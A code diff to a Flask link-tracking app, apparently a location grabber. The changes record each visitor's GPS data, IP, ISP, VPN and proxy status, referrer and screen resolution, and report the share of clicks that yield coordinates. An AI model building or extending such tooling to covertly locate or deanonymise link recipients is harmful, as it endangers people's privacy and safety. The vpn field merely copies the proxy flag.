@@ -7,11 +7,17 @@ import os
 from hashids import Hashids
 import json
 from dotenv import load_dotenv
+from urllib.request import urlopen
+from urllib.parse import urlencode, quote
 
 # Load environment variables
 load_dotenv()
 
 app = Flask(__name__, instance_path='/tmp' if os.environ.get('VERCEL') else None)
+
+@app.template_filter('urlencode')
+def urlencode_filter(s):
+    return quote(s, safe='')
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
 db_path = os.environ.get('DATABASE_URL')
 if not db_path:
@@ -73,6 +79,12 @@ class LocationData(db.Model):
     user_agent = db.Column(db.String(500))
     country = db.Column(db.String(100))
     city = db.Column(db.String(100))
+    isp = db.Column(db.String(200))
+    vpn = db.Column(db.Boolean, default=False)
+    proxy = db.Column(db.Boolean, default=False)
+    hosting = db.Column(db.Boolean, default=False)
+    referrer = db.Column(db.String(1000))
+    screen_resolution = db.Column(db.String(50))
     
     # Relationship
     link = db.relationship('TrackedLink', backref=db.backref('locations', lazy=True))
@@ -88,7 +100,13 @@ class LocationData(db.Model):
             'ip_address': self.ip_address,
             'user_agent': self.user_agent,
             'country': self.country,
-            'city': self.city
+            'city': self.city,
+            'isp': self.isp,
+            'vpn': self.vpn,
+            'proxy': self.proxy,
+            'hosting': self.hosting,
+            'referrer': self.referrer,
+            'screen_resolution': self.screen_resolution
         }
 
 # Routes
@@ -99,7 +117,19 @@ def index():
 @app.route('/dashboard')
 def dashboard():
     links = TrackedLink.query.order_by(TrackedLink.created_at.desc()).all()
-    return render_template('dashboard.html', links=links)
+    link_data = []
+    for link in links:
+        loc_count = LocationData.query.filter_by(link_id=link.id).count()
+        conversion = round((loc_count / link.clicks * 100)) if link.clicks > 0 else 0
+        vpn_count = LocationData.query.filter_by(link_id=link.id, vpn=True).count()
+        link_data.append({
+            'link': link,
+            'loc_count': loc_count,
+            'conversion': conversion,
+            'vpn_count': vpn_count,
+            'short_url': url_for('redirect_link', short_code=link.short_code, _external=True)
+        })
+    return render_template('dashboard.html', link_data=link_data)
 
 @app.route('/create', methods=['POST'])
 def create_link():
@@ -166,16 +196,33 @@ def save_location():
         if not link:
             return jsonify({'error': 'Link not found'}), 404
         
+        # IP-Info abrufen (ISP, VPN, Proxy, Hosting)
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if ip and ',' in ip:
+            ip = ip.split(',')[0].strip()
+        ip_info = {}
+        try:
+            resp = urlopen(f'http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,hosting,query', timeout=3)
+            ip_info = json.loads(resp.read().decode())
+        except Exception:
+            pass
+        
         # Standortdaten speichern
         location_data = LocationData(
             link_id=link.id,
             latitude=latitude,
             longitude=longitude,
             accuracy=accuracy,
-            ip_address=request.remote_addr,
+            ip_address=ip,
             user_agent=request.headers.get('User-Agent'),
-            country=data.get('country'),
-            city=data.get('city')
+            country=ip_info.get('country', data.get('country')),
+            city=ip_info.get('city', data.get('city')),
+            isp=ip_info.get('isp'),
+            vpn=ip_info.get('proxy', False),
+            proxy=ip_info.get('proxy', False),
+            hosting=ip_info.get('hosting', False),
+            referrer=data.get('referrer'),
+            screen_resolution=data.get('screen_resolution')
         )
         
         db.session.add(location_data)
@@ -195,9 +242,15 @@ def get_locations(link_id):
 def view_link_details(link_id):
     link = TrackedLink.query.get_or_404(link_id)
     locations = LocationData.query.filter_by(link_id=link_id).order_by(LocationData.timestamp.desc()).all()
+    conversion_rate = round((len(locations) / link.clicks * 100)) if link.clicks > 0 else 0
+    short_url = url_for('redirect_link', short_code=link.short_code, _external=True)
+    vpn_count = sum(1 for loc in locations if loc.vpn)
     return render_template('link_details.html', 
                          link=link, 
                          locations=locations,
+                         conversion_rate=conversion_rate,
+                         short_url=short_url,
+                         vpn_count=vpn_count,
                          google_maps_api_key=os.environ.get('GOOGLE_MAPS_API_KEY', 'YOUR_API_KEY'))
 
 @app.route('/api/links')
